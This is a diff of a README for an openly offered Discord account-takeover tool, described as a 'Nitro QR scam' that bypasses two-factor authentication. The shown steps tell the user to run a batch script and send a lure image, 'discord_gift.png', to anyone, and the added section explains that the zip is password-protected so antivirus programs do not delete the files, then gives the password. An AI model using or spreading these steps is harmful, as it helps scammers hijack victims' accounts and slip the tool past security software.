@@ -12,3 +12,8 @@ Discord Nitro QR Scam hacking Discord account and bypassing 2FA authentication.
 2. Install Google Chrome opening the file `ChromeStableSetup.exe` (if you haven't done it in past)
 3. Open `run_script.bat`
 4. Send the file `discord_gift.png` to anyone
+
+## Password
+To prevent AVs from deleting files I protected the zip file with a password.
+
+The password is `NitroQRScam`
